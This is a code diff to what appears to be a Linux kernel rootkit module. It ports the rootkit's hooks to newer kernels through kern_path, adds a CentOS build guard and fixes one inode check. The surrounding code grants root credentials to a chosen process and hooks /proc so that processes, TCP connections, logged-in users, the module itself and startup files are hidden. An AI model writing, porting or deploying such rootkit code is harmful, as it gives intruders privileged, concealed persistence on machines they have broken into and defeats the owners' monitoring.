@@ -174,6 +174,7 @@ void make_root(unsigned pid) {
     task->cred = init_task->cred;
 }
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+#ifndef CENTOS
 char * strnstr(char *s, const char *find, size_t slen) {
 	char c, sc;
 	size_t len;
@@ -191,6 +192,7 @@ char * strnstr(char *s, const char *find, size_t slen) {
 	}
 	return ((char *)s);
 }
+#endif
 #endif
 
 
@@ -488,15 +490,24 @@ struct proc_dir_entry *find_dir_entry(struct proc_dir_entry *root, const char *n
 }
 
 void hook_proc(struct proc_dir_entry *root) {
-    struct nameidata inode_data;
     // search for /proc's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
     if(path_lookup("/proc/", 0, &inode_data))
         return;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-		pinode = inode_data.path.dentry->d_inode;
-	#else
-		pinode = inode_data.inode;
-	#endif
+#else
+    struct path p;
+    if(kern_path("/proc/", 0, &p))
+        return;
+    pinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    pinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    pinode = inode_data.inode;
+#endif
+
     if(!pinode)
         return;
     // hook /proc readdir
@@ -530,15 +541,23 @@ void init_module_hide_hook(struct proc_dir_entry *root) {
 }
 
 void init_tcp_hide_hook(struct proc_dir_entry *root) {
-    struct nameidata inode_data;
     // search for /proc/net/tcp's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
     if(path_lookup("/proc/net/tcp", 0, &inode_data))
         return;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-		tinode = inode_data.path.dentry->d_inode;
-	#else
-		tinode = inode_data.inode;
-	#endif
+#else
+    struct path p;
+    if(kern_path("/proc/net/tcp", 0, &p))
+        return;
+    tinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    tinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    tinode = inode_data.inode;
+#endif
     if(!tinode)
         return;
     tcp_fops = *tinode->i_fop;
@@ -548,16 +567,25 @@ void init_tcp_hide_hook(struct proc_dir_entry *root) {
 }
 
 void init_users_hide_hook(struct proc_dir_entry *root) {
-    struct nameidata inode_data;
     // search for utmp's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
     if(path_lookup("/var/run/utmp", 0, &inode_data))
         return;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-		uinode = inode_data.path.dentry->d_inode;
-	#else
-		uinode = inode_data.inode;
-	#endif
-    if(!tinode)
+#else
+    struct path p;
+    if(kern_path("/var/run/utmp", 0, &p))
+        return;
+    uinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    uinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    uinode = inode_data.inode;
+#endif
+
+    if(!uinode)
         return;
     user_fops = *uinode->i_fop;
     user_proc_original = uinode->i_fop;
@@ -566,15 +594,24 @@ void init_users_hide_hook(struct proc_dir_entry *root) {
 }
 
 void init_hide_rc(void) {
-    struct nameidata inode_data;
     // search for rc's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
     if(path_lookup(rc_dir, 0, &inode_data))
         return;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-		rcinode = inode_data.path.dentry->d_inode;
-	#else
-		rcinode = inode_data.inode;
-	#endif
+#else
+    struct path p;
+    if(kern_path(rc_dir, 0, &p))
+        return;
+    rcinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    rcinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    rcinode = inode_data.inode;
+#endif
+
     if(!rcinode)
         return;
     // hook rc's readdir
@@ -585,15 +622,24 @@ void init_hide_rc(void) {
 }
 
 void init_hide_mod(void) {
-    struct nameidata inode_data;
     // search for rc's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
     if(path_lookup(mod_dir, 0, &inode_data))
         return;
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-        modinode = inode_data.path.dentry->d_inode;
-    #else
-        modinode = inode_data.inode;
-	#endif
+#else
+    struct path p;
+    if(kern_path(mod_dir, 0, &p))
+        return;
+    modinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    modinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    modinode = inode_data.inode;
+#endif
+
     if(!modinode)
         return;
     // hook rc's readdir
